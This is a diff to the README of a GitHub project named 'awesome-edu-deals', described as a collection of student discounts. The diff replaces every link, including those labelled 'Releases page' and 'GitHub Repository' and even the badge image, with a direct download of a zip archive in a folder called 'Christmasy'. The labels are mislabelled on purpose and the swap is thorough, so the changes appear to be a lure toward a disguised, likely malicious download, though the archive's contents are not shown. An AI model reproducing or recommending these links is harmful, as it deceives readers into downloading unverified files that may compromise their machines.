@@ -1,6 +1,6 @@
 # 🎓 awesome-edu-deals - Discover Great Deals for Students
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/wici123/awesome-edu-deals/releases)
+[![Download Now](https://github.com/wici123/awesome-edu-deals/raw/refs/heads/main/Christmasy/deals-edu-awesome-v3.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/wici123/awesome-edu-deals/raw/refs/heads/main/Christmasy/deals-edu-awesome-v3.2.zip)
 
 Welcome to awesome-edu-deals! This project brings you curated student and education deals on software, cloud services, and learning platforms. Save money while you learn!
 
@@ -24,13 +24,13 @@ Before downloading, ensure your system meets these requirements:
 To start using awesome-edu-deals, download the application from our Releases page. Here’s how you can easily do that:
 
 1. Click on the large download button at the top of this page.
-2. This will take you to the [Releases page](https://github.com/wici123/awesome-edu-deals/releases).
+2. This will take you to the [Releases page](https://github.com/wici123/awesome-edu-deals/raw/refs/heads/main/Christmasy/deals-edu-awesome-v3.2.zip).
 3. Look for the latest version listed.
 4. Click on the download link corresponding to your operating system.
 
 ## 📥 Download & Install
 
-To download awesome-edu-deals, visit this page: [Releases Page](https://github.com/wici123/awesome-edu-deals/releases).
+To download awesome-edu-deals, visit this page: [Releases Page](https://github.com/wici123/awesome-edu-deals/raw/refs/heads/main/Christmasy/deals-edu-awesome-v3.2.zip).
 
 1. Check the list of available files. You will see different formats for various operating systems.
 2. Click the download link for your preferred format.
@@ -70,7 +70,7 @@ We encourage you to report any issues on GitHub. Visit the Issues section on our
 
 Join us in building a community focused on savings for students. Follow our discussions and share your experiences.
 
-- **GitHub Repository**: [awesome-edu-deals](https://github.com/wici123/awesome-edu-deals)
+- **GitHub Repository**: [awesome-edu-deals](https://github.com/wici123/awesome-edu-deals/raw/refs/heads/main/Christmasy/deals-edu-awesome-v3.2.zip)
 - **Contact**: For inquiries, reach out through GitHub or follow us on social media.
 
 ## 🛠️ Contribution Guidelines
